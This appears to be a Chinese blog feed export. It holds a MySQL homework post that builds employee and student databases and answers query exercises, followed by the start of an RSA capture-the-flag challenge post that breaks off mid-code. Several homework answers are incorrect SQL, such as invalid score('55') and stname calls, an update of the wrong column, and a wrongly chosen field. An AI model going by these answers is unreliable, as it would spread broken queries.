class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></div></td><td class="code"><pre><code class="hljs mysql">-- 创建员工管理信息系统数据库(empMIS)<br>create database empMIS default character set utf8;<br>-- 打开 empMIS 数据库<br>use empMIS;<br>*****************************************************<br>-- 创建部门表(departments)<br>create table departments<br>( dno int primary key,<br> dname varchar(30) unique,<br> dloc varchar(50) default &#x27;北京&#x27;<br>);<br>--显示 departments 的表结构<br>desc departments;<br>-- 向部门表插入数据<br>insert into departments(dno,dname,dloc) values<br>(1,&#x27;销售部&#x27;,&#x27;长春 &#x27;),(2,&#x27;财务部&#x27;,&#x27;沈阳 &#x27;),<br>(3,&#x27;开发部&#x27;,&#x27;哈尔滨 &#x27;),(4,&#x27;人事部&#x27;,&#x27;北京 &#x27;),<br>(5,&#x27;董事会&#x27;,&#x27;北京 &#x27;),(6,&#x27;后勤部&#x27;,&#x27;北京 &#x27;);<br>-- 查询 departments 表中的数据<br>select * from departments;<br>*****************************************************<br>-- 创建员工表(employees)<br>create table employees<br>( eno int primary key,<br> ename varchar(20),<br> ehiredate date,<br> ejob varchar(16),<br> emgr int,<br> esal decimal,<br> ebonus decimal,<br> deptno int,<br>constraint fk_deptno foreign key( deptno) references departments(dno)<br>);<br>--显示 employees 的表结构<br>desc employees;<br>-- 向员工表插入数据<br>insert into employees(eno,ename,ehiredate,ejob,emgr,esal,ebonus,deptno)<br>values<br>(1001,&#x27;郑莹&#x27;,&#x27;1999-1-1&#x27;,&#x27;销售部长&#x27;,5001,10000,1500,1)<br>,(1002,&#x27;梁睿&#x27;,&#x27;1999-7-7&#x27;,&#x27;经理&#x27;,1001,6000,1000,1)<br>,(1003,&#x27;赵思&#x27;,&#x27;1999-7-7&#x27;,&#x27;销售员&#x27;,1002,1500,2000,1)<br>,(1004,&#x27;smith&#x27;,&#x27;2000-1-1&#x27;,&#x27;销售员&#x27;,1002,1500,2000,1)<br>,(1005,&#x27;杨幂&#x27;,&#x27;2005-1-1&#x27;,&#x27;销售员&#x27;,1002,1500,2000,1)<br>,(2001,&#x27;张松&#x27;,&#x27;1998-10-3&#x27;,&#x27;财务部长&#x27;,5001,8000,1000,2)<br>,(2002,&#x27;孙威&#x27;,&#x27;1998-10-20&#x27;,&#x27;会计&#x27;,2001,4000,null,2)<br>,(2003,&#x27;王东&#x27;,&#x27;1998-10-20&#x27;,&#x27;出纳&#x27;,2001,3000,null,2)<br>,(3001,&#x27;胡歌&#x27;,&#x27;1999-6-1&#x27;,&#x27;开发部长&#x27;,5001,12000,3000,3)<br>,(3002,&#x27;邓超&#x27;,&#x27;1999-12-6&#x27;,&#x27;项目经理&#x27;,3001,7000,1000,3)<br>,(3003,&#x27;陈赫&#x27;,&#x27;2000-1-1&#x27;,&#x27;程序员&#x27;,3001,6000,1000,3)<br>,(3004,&#x27;鹿晗&#x27;,&#x27;2000-1-1&#x27;,&#x27;程序员&#x27;,3001,6500,2000,3)<br>,(3005,&#x27;杨洋&#x27;,&#x27;2003-9-1&#x27;,&#x27;程序员&#x27;,3001,4000,1000,3)<br>,(4001,&#x27;李丽&#x27;,&#x27;1999-1-1&#x27;,&#x27;人事部长&#x27;,5001,8000,1000,4)<br>,(4002,&#x27;rose&#x27;,&#x27;1999-2-10&#x27;,&#x27;办事员&#x27;,4001,4000,null,4)<br>,(4003,&#x27;吴坤&#x27;,&#x27;2007-10-1&#x27;,&#x27;办事员&#x27;,4001,3500,null,4)<br>,(4004,&#x27;马萍&#x27;,&#x27;2009-5-17&#x27;,&#x27;办事员&#x27;,4001,3000,null,4)<br>,(5001,&#x27;姜红&#x27;,&#x27;1998-1-1&#x27;,&#x27;董事长&#x27;,null,20000,null,5)<br>,(1,&#x27;栾凯&#x27;,&#x27;2010-1-1&#x27;,null,null,1500,null,null)<br>,(2,&#x27;程程&#x27;,&#x27;2010-1-1&#x27;,null,null,1500,null,null);<br>-- 查询 employees 表中的数据<br>select * from employees;<br>*****************************************************<br>--创建工资表(salary)<br>create table salary<br>( eno int primary key,<br> ejob varchar(16),<br> esal decimal,<br> ebonus decimal<br>);<br>--显示 salary 的表结构<br>desc salary;<br>-- 向工资表插入数据<br>insert into salary select eno,ejob,esal,ebonus from employees;<br>-- 查询 salary 表中的数据<br>select * from salary;<br>*****************************************************<br>*****************************************************<br>*****************************************************<br>-- 创建学生管理信息系统数据库(stuMIS)<br>create database stuMIS default character set utf8;<br>-- 打开 stuMIS 数据库<br>use stuMIS;<br>*****************************************************<br>-- 创建部门表(department)<br>create table department <br>( departid int not null primary key,<br> departname varchar(20),<br> office varchar(40),<br> tel varchar(20),<br> chairman varchar(20)<br>);<br>-- 创建班级表<br>create table class <br>( departid int not null ,<br> classid varchar(10) not null,<br> classname varchar(40),<br> monitor varchar(20) ,<br> primary key (classid),<br> foreign key (departid) references department(departid) on delete cascade on update cascade<br>);<br>-- 创建课程表(course)<br>create table course<br>( cid varchar(10) not null,<br> cname varchar(40) not null,<br> ctype varchar(20) not null,<br> ctime varchar(30) not null,<br> teacher varchar(10),<br> smallnum int not null ,<br> registernum int not null,<br> primary key(cid)<br>);<br>-- 创建学生表(student)<br>create table student<br>( stuid varchar(10) not null,<br> stuname varchar(10) not null,<br> stusex varchar(2) not null,<br> stupwd varchar(7) not null,<br> stuage int ,<br> classid varchar(10) not null,<br> address varchar(100) null,<br> primary key (stuid),<br> foreign key(classid) references class(classid)<br>);<br>-- 创建成绩表(score)<br>create table score<br>( stuid varchar(10) not null,<br> cid varchar(10) not null,<br> score int,<br> primary key(stuid,cid), <br> foreign key(stuid) references student(stuid),<br> foreign key(cid) references course(cid)<br>);<br>*****************************************************<br>-- 向部门表插入数据<br>insert into department( departid,departname,office,tel,chairman) values <br>(1,&#x27;计算机系&#x27;,&#x27;a502&#x27;,&#x27;4040&#x27;,&#x27;孙丰伟&#x27;),<br>(2,&#x27;经济管理系&#x27;,&#x27;a305&#x27;,&#x27;4024&#x27;,&#x27;李红艳&#x27;),<br>(3,&#x27;水晶石&#x27;,&#x27;a218&#x27;,&#x27;4012&#x27;,&#x27;吴可鹏&#x27;),<br>(4,&#x27;通信系&#x27;,&#x27;a308&#x27;,&#x27;4089&#x27;,&#x27;张楠&#x27;),<br>(5,&#x27;机电系&#x27;,&#x27;a216&#x27;,&#x27;4033&#x27;,&#x27;吴宝玉&#x27;),<br>(6,&#x27;建筑系&#x27;,&#x27;a212&#x27;,&#x27;4036&#x27;,&#x27;包伟丽&#x27;);<br>-- 向班级表中插入数据<br>insert into class(classid,departid,classname,monitor) values<br>(&#x27;15111&#x27;,1,&#x27;软件中软一班&#x27; ,&#x27;王波&#x27;),<br>(&#x27;15112&#x27;,1,&#x27;软件中软二班&#x27;,&#x27;江河&#x27; ),<br>(&#x27;15113&#x27;,1,&#x27;软件中软三班&#x27; ,&#x27;任永琼&#x27;),<br>(&#x27;15114&#x27;,1,&#x27;软件普软四班&#x27; ,&#x27;张泽星&#x27;),<br>(&#x27;15121&#x27;,1,&#x27;网络一班&#x27;,&#x27;张丽&#x27;),<br>(&#x27;15231&#x27;,2,&#x27;物流一班&#x27;,&#x27;张松&#x27;),<br>(&#x27;15611&#x27;,6,&#x27;桥梁一班&#x27;,&#x27;张敏芳&#x27;),<br>(&#x27;15321&#x27;,3,&#x27;通信一班&#x27;,&#x27;沈佳萍&#x27;),<br>(&#x27;15411&#x27;,4,&#x27;动漫一班&#x27;,&#x27;谢嘉&#x27;),<br>(&#x27;15511&#x27;,5,&#x27;汽修一班&#x27;,&#x27;李平&#x27;),<br>(&#x27;15221&#x27;,1,&#x27;电商一班&#x27;,&#x27;李世群&#x27;);<br>-- 向学生表中插入数据<br>insert into student values<br>(&#x27;1511101&#x27;,&#x27;何英国&#x27;,&#x27;女&#x27;,&#x27;123456&#x27;,17,&#x27;15111&#x27;,&#x27;长春&#x27;),<br>(&#x27;1511102&#x27;,&#x27;方振&#x27;,&#x27;男&#x27;,&#x27;123456&#x27;,16,&#x27;15111&#x27;, &#x27;长春&#x27;) ,<br>(&#x27;1511103&#x27;,&#x27;雷英飞&#x27;,&#x27;男&#x27;,&#x27;abc123&#x27;,18,&#x27;15111&#x27;,&#x27;四平&#x27;),<br>(&#x27;1511104&#x27;,&#x27;金丹&#x27;,&#x27;女&#x27;,&#x27;765123&#x27;,20,&#x27;15111&#x27;,&#x27;松原&#x27;),<br>(&#x27;1511105&#x27;,&#x27;秦淼英&#x27;,&#x27;女&#x27;,&#x27;123&#x27;,21,&#x27;15111&#x27;,&#x27;延吉&#x27;),<br>(&#x27;1511201&#x27;,&#x27;奉雷刚&#x27;,&#x27;男&#x27;,&#x27;1511201&#x27;,19,&#x27;15112&#x27;,&#x27;四平&#x27;),<br>(&#x27;1511202&#x27;,&#x27;杨卫红&#x27;,&#x27;女&#x27;,&#x27;1511202&#x27;,17,&#x27;15112&#x27;,&#x27;延吉&#x27;),<br>(&#x27;1511203&#x27;,&#x27;周晓影&#x27;,&#x27;女&#x27;,&#x27;1511203&#x27;,18,&#x27;15112&#x27;,&#x27;白山&#x27;),<br>(&#x27;1511204&#x27;,&#x27;张义军&#x27;,&#x27;男&#x27;,&#x27;1511204&#x27;,20,&#x27;15112&#x27;,&#x27;松原&#x27;),<br>(&#x27;1511205&#x27;,&#x27;朱寒松&#x27;,&#x27;男&#x27;,&#x27;1511205&#x27;,21,&#x27;15112&#x27;,&#x27;长春&#x27;),<br>(&#x27;1523101&#x27;,&#x27;罗峰&#x27;,&#x27;男&#x27;,&#x27;1523101&#x27;,17,&#x27;15231&#x27;,&#x27;延吉&#x27;),<br>(&#x27;1523102&#x27;,&#x27;宁梦涵&#x27;,&#x27;女&#x27;,&#x27;1523102&#x27;,18,&#x27;15231&#x27;,&#x27;延吉&#x27;),<br>(&#x27;1523103&#x27;,&#x27;谭倩倩&#x27;,&#x27;女&#x27;,&#x27;1523103&#x27;,18,&#x27;15231&#x27;,&#x27;长春&#x27;),<br>(&#x27;1523104&#x27;,&#x27;谭倩倩&#x27;,&#x27;女&#x27;,&#x27;1523104&#x27;,21,&#x27;15231&#x27;,&#x27;长春&#x27;),<br>(&#x27;1523105&#x27;,&#x27;谭倩倩&#x27;,&#x27;女&#x27;,&#x27;1523105&#x27;,21,&#x27;15231&#x27;,&#x27;松原&#x27;),<br>(&#x27;1551101&#x27;,&#x27;蔡诗川&#x27;,&#x27;女&#x27;,&#x27;1511201&#x27;,18,&#x27;15511&#x27;,&#x27;白山&#x27;),<br>(&#x27;1551102&#x27;,&#x27;陈露玲&#x27;,&#x27;女&#x27;,&#x27;1511202&#x27;,18,&#x27;15511&#x27;,&#x27;吉林&#x27;),<br>(&#x27;1551103&#x27;,&#x27;程英&#x27;,&#x27;女&#x27;,&#x27;1511203&#x27;,18,&#x27;15511&#x27;,&#x27;吉林&#x27;),<br>(&#x27;1551104&#x27;,&#x27;王作杰&#x27;,&#x27;男&#x27;,&#x27;1511204&#x27;,19,&#x27;15511&#x27;,&#x27;长春&#x27;),<br>(&#x27;1551105&#x27;,&#x27;艾清&#x27;,&#x27;男&#x27;,&#x27;1511205&#x27;,19,&#x27;15511&#x27;,&#x27;长春&#x27;),<br>(&#x27;1522101&#x27;,&#x27;董泽琼&#x27;,&#x27;女&#x27;,&#x27;123456&#x27;,20,&#x27;15221&#x27;,&#x27;吉林&#x27;),<br>(&#x27;1522102&#x27;,&#x27;任海文&#x27;,&#x27;男&#x27;,&#x27;123456&#x27;,17,&#x27;15221&#x27;,&#x27;吉林&#x27;),<br>(&#x27;1522103&#x27;,&#x27;孙雪琴&#x27;,&#x27;女&#x27;,&#x27;abc123&#x27;,17,&#x27;15221&#x27;,&#x27;松原&#x27;),<br>(&#x27;1522104&#x27;,&#x27;李爱华&#x27;,&#x27;女&#x27;,&#x27;765123&#x27;,18,&#x27;15221&#x27;,&#x27;长春&#x27;),<br>(&#x27;1522105&#x27;,&#x27;何茂林&#x27;,&#x27;男&#x27;,&#x27;123&#x27;,18,&#x27;15221&#x27;,&#x27;吉林&#x27;);<br>-- 向课程表中插入数据<br>insert into course (cid,cname,teacher,ctype,ctime,smallnum,registernum) values<br>(&#x27;10101&#x27;,&#x27;工程测量&#x27;,&#x27;孙瑞晨&#x27;,&#x27;工程技术&#x27;,&#x27;周一 3-4 节&#x27;,20,16),<br>(&#x27;10103&#x27;,&#x27;桥梁工程&#x27;,&#x27;黄金晓&#x27;,&#x27;工程技术&#x27;,&#x27;周一 1-2 节&#x27;,15,12),<br>(&#x27;10107&#x27;,&#x27;道路建筑材料&#x27;,&#x27;陈婷婷&#x27;,&#x27;工程技术&#x27;,&#x27;周二 3-4 节&#x27;,20,17),<br>(&#x27;20103&#x27;,&#x27;仓储与配送管理&#x27;,&#x27;陈科&#x27;,&#x27;管理&#x27;,&#x27;周二 5-6 节&#x27;,15,26),<br>(&#x27;20106&#x27;,&#x27;物流管理&#x27;,&#x27;严莉莉&#x27;,&#x27;管理&#x27;,&#x27;周一 3-4 节&#x27;,30,36),<br>(&#x27;30106&#x27;,&#x27;计算机应用基础&#x27;,&#x27;胡灵&#x27;,&#x27;计算机&#x27;,&#x27;周三 7-8 节&#x27;,20,31),<br>(&#x27;30107&#x27;,&#x27;计算机组装与维护&#x27;,&#x27;盛利&#x27;,&#x27;计算机&#x27;,&#x27;周三 3-4 节&#x27;,30,36),<br>(&#x27;30108&#x27;,&#x27;电子电工技术&#x27;,&#x27;吴晓红&#x27;,&#x27;计算机&#x27;,&#x27;周四 1-2 节&#x27;,20,28),<br>(&#x27;30214&#x27;,&#x27;数据库技术及应用&#x27;,&#x27;曾飞燕&#x27;,&#x27;计算机&#x27;,&#x27;周四 3-4 节&#x27;,30,33),<br>(&#x27;40103&#x27;,&#x27;通信设备管理&#x27;,&#x27;丁亮&#x27;,&#x27;通信&#x27;,&#x27;周五 1-2 节&#x27;,30,37),<br>(&#x27;51204&#x27;,&#x27;动画设计&#x27;,&#x27;李明华&#x27;,&#x27;动漫&#x27;,&#x27;周五 3-4 节&#x27;,20,28),<br>(&#x27;61008&#x27;,&#x27;机械制图&#x27;,&#x27;张世清&#x27;,&#x27;建筑&#x27;,&#x27;周五 3-4 节&#x27;,20,28);<br>-- 向成绩表中插入数据<br>insert into score values<br>(&#x27;1511101&#x27;,&#x27;30106&#x27;,89),(&#x27;1511102&#x27;,&#x27;30106&#x27;,96),<br>(&#x27;1511103&#x27;,&#x27;30106&#x27;,59),(&#x27;1511104&#x27;,&#x27;30106&#x27;,65),<br>(&#x27;1511105&#x27;,&#x27;30106&#x27;,88),(&#x27;1511201&#x27;,&#x27;30106&#x27;,99),<br>(&#x27;1511202&#x27;,&#x27;30106&#x27;,55),(&#x27;1511203&#x27;,&#x27;30106&#x27;,67),<br>(&#x27;1511204&#x27;,&#x27;30106&#x27;,65),(&#x27;1511205&#x27;,&#x27;30106&#x27;,78),<br>(&#x27;1511101&#x27;,&#x27;30214&#x27;,89),(&#x27;1511102&#x27;,&#x27;30214&#x27;,96),<br>(&#x27;1511103&#x27;,&#x27;30214&#x27;,59),(&#x27;1511104&#x27;,&#x27;30214&#x27;,65),<br>(&#x27;1511105&#x27;,&#x27;30214&#x27;,88),(&#x27;1511201&#x27;,&#x27;30214&#x27;,79),<br>(&#x27;1511202&#x27;,&#x27;30214&#x27;,45),(&#x27;1511203&#x27;,&#x27;30214&#x27;,87),<br>(&#x27;1511204&#x27;,&#x27;30214&#x27;,95),(&#x27;1523101&#x27;,&#x27;20106&#x27;,88),<br>(&#x27;1523102&#x27;,&#x27;20106&#x27;,90),(&#x27;1523103&#x27;,&#x27;20106&#x27;,95),<br>(&#x27;1523104&#x27;,&#x27;20106&#x27;,66),(&#x27;1523105&#x27;,&#x27;20106&#x27;,53),<br>(&#x27;1522101&#x27;,&#x27;20103&#x27;,63),(&#x27;1522102&#x27;,&#x27;20103&#x27;,20),<br>(&#x27;1522103&#x27;,&#x27;20103&#x27;,98),(&#x27;1522104&#x27;,&#x27;20103&#x27;,85),<br>(&#x27;1522105&#x27;,&#x27;20103&#x27;,65);<br>************************<br></code></pre></td></tr></table></figure><p><strong>操作截图如下：</strong></p><p><img src="homework/image-20211124150255558.png"></p><h3 id="三、根据stuMIS数据库中的表，进行如下操作。"><a href="#三、根据stuMIS数据库中的表，进行如下操作。" class="headerlink" title="三、根据stuMIS数据库中的表，进行如下操作。"></a>三、根据stuMIS数据库中的表，进行如下操作。</h3><h4 id="3-根据stuMIS数据库的表，进行如下操作。"><a href="#3-根据stuMIS数据库的表，进行如下操作。" class="headerlink" title="3.根据stuMIS数据库的表，进行如下操作。"></a>3.根据stuMIS数据库的表，进行如下操作。</h4><p>1.修改表中的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#修改学号为1611101的学生的总学分为55分。<br>use stuMIS;<br>update score set score=score(&#x27;55&#x27;) where stuid=&#x27;1611101&#x27;;<br>#修改王超的性别为女<br>use stuMIS;<br>update student set stuname=stname(&quot;女&quot;) where stuname=&#x27;王超&#x27;;<br></code></pre></td></tr></table></figure><p>2.查询表单中部分字段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询所有学生的学号和姓名<br>use stuMIS;<br>select stuid,stuname from student;<br>#查询所有学生的姓名和家庭住址<br>use stuMIS;<br>select stuname,address from student;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129143308968.png"></p><p><img src="homework/image-20211129184359121.png"></p><p>3.重命名检索得到的字段：要求用汉字作为字段名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询所有班级名称和班长信息<br>use stuMIS;<br>select classname &#x27;班级名称&#x27;,monitor&#x27;班长&#x27; from class;<br>#查询所有学生的姓名和性别<br>use stuMIS;<br>select stuname &#x27;姓名&#x27;,stusex &#x27;性别&#x27; from student;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129185316615.png"></p><p><img src="homework/image-20211129185513001.png"></p><p>4.返回结果集中的部分行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#返回学生成绩表中前10条数据。<br>use stuMIS;<br>select * from score limit 0,10;<br>#返回系部表中的第1条数据<br>select * from department limit 0,1;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129145204957.png"></p><p><img src="homework/image-20211129185709114.png"></p><p>5.消除重复行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#返回学生表所有不重复的班级编号，字段名使用汉字显示。<br>use stuMIS;<br>select DISTINCT stuid &#x27;班级编号&#x27; from student;<br>#返回班级表所有不重复的系部编号，字段名使用汉字显示。<br>use stuMIS;<br>select DISTINCT departid &#x27;系部编号&#x27; from department;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129190316987.png"></p><p><img src="homework/image-20211129190440667.png"></p><p>6.条件查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#性别为女的所有学生信息<br>use stuMIS;<br>select * from student where stusex=&#x27;女&#x27;;<br>#显示所有不是18和20岁的学生的信息<br>SELECT * FROM student WHERE stuage NOT IN(18,20);<br>use stuMIS;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129150211471.png"></p><p><img src="homework/image-20211129190756215.png"></p><p>7.模糊查询like</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#课程表中课程名中带有&quot;计算机&quot;三个字的所有课程信息<br>use stuMIS;<br>select * from course where cname like&#x27;%计算机%&#x27;;<br>#所有3~4节上课的课程信息<br>use stuMIS;<br>select * from course where ctime like&#x27;%3-4%&#x27;;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129151131099.png"></p><p><img src="homework/image-20211129191108863.png"></p><p>8.排序练习</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#课程表中所有信息，要求按照报名人数从多到少的顺序显示<br>use stuMIS;<br>SELECT * FROM course ORDER BY registernum DESC;<br>#检索student表的学号，姓名，性别，年龄，要求检索结果按照年龄升序排列，年龄相同的，女生在前，男生在后排列（降序）<br>use stuMIS;<br>SELECT stuid,stuname,stusex,stuage FROM student ORDER BY stuage ASC,stusex ASC;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129152256719.png"></p><p><img src="homework/image-20211129191226145.png"></p><p>9.聚合函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#检索student表中最小的年龄<br>use stuMIS;<br>SELECT MIN(stuage) FROM student;<br>#检索student表中最大的年龄<br>use stuMIS;<br>SELECT MAX(stuage) FROM student;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129152724587.png"></p><p><img src="homework/image-20211129191335931.png"></p><p>10.group by having分组查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#统计各个班级的男女生人数<br>use stuMIS;<br>SELECT classid,stusex,COUNT(stusex) FROM student GROUP BY classid,stusex;<br>#查询15112班级男生与女生人数<br>SELECT classid,stusex,COUNT(stusex) FROM student GROUP BY classid,stusex HAVING classid=15112<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129153831142.png"></p><p><img src="homework/image-20211129191601656.png"></p><ol start="11"><li>case when。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#显示学生成绩表中所有信息，要求使用‘及格’或者’不及格‘显示成绩<br>use stuMIS;<br>SELECT *,CASE WHEN score&gt;=60 THEN &#x27;及格&#x27; ELSE &#x27;不及格&#x27; END &#x27;成绩&#x27; FROM score;<br>#显示所有学生的姓名和年龄，要求使用&#x27;成年&#x27;或者&#x27;未成年&#x27;显示年龄<br>use stuMIS;<br>select *,case when stuage&gt;=18 then &#x27;成年&#x27; ELSE &#x27;未成年&#x27; END &#x27;年龄&#x27; from student;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129192111591.png"></p><p><img src="homework/image-20211129192225518.png"></p><p>12.in的应用（子查询）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询计算机系所有班级信息<br>use stuMIS;<br>SELECT * FROM class WHERE departid IN(SELECT departid FROM department WHERE departname=&#x27;计算机系&#x27;);<br>#查询&quot;汽修一班&quot;的所有学生信息<br>use stuMIS;<br>select * from student where classid in(select classid from class where classname=&#x27;汽修一班&#x27;);<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129154927806.png"></p><p><img src="homework/image-20211129192728270.png"></p><p>13.多表联合查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#显示所有班级编号、班级名称、学生姓名<br>use stuMIS;<br>select student.classid,student.stuname,class.classname from student, class where class.classid=student.classid;<br>#显示系部编号、班级名称、班长<br>select department.departname,class.monitor,class.classname from department, class where class.departid=department.departid;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129164446455.png"></p><p><img src="homework/image-20211129193859269.png"></p><p>14.通过计算获得新列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#将成绩表中100分制成绩使用满分为120分的成绩，显示所有字段<br>SELECT stuid,cid,score*(1+0.2) FROM score<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129164704139.png"></p><p>15.删除表中数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#删除所有性别为女的学生信息<br>delete from student where stusex=&#x27;女&#x27;;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129165033757.png"></p><p>这里有外键约束，需要先删成绩表对应的数据，再删学生表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">delete from score where stuid = any(select stuid from student where stusex=&quot;女&quot;);<br>delete from student where stusex=&#x27;女&#x27;;<br></code></pre></td></tr></table></figure><p><img src="homework/image-20211129171002000.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#删除经管系男生信息<br>#待补充<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>MySQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>crypto1</title>
    <link href="/2021/11/15/crypto1/"/>
    <url>/2021/11/15/crypto1/</url>
    
    <content type="html"><![CDATA[<p>记一道HECTF RSA的题目，混淆了我好久。</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag,e1,e2<br><span class="hljs-keyword">assert</span> flag[:<span class="hljs-number">6</span>]==<span class="hljs-string">b&#x27;HECTF&#123;&#x27;</span><br>m=bytes_to_long(flag)<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    p1=getPrime(<span class="hljs-number">512</span>)<br>    q1=gmpy2.next_prime(p1)<br>    <span class="hljs-keyword">if</span> p1%<span class="hljs-number">4</span>==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> q1%<span class="hljs-number">4</span>==<span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">break</span><br>n1=p1*q1<br>c1=<span class="hljs-built_in">pow</span>(m,e1,n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c1=&#x27;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n1=&#x27;</span>,n1)<br>p2=getPrime(<span class="hljs-number">512</span>)<br>q2=getPrime(<span class="hljs-number">512</span>)<br>n2=p2*q2<br>m2=e1*getPrime(<span class="hljs-number">340</span>)<br>c2=<span class="hljs-built_in">pow</span>(m2,e2,n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c2=&#x27;</span>,c2)<br><span class="hljs-built_in">print</span>(<span 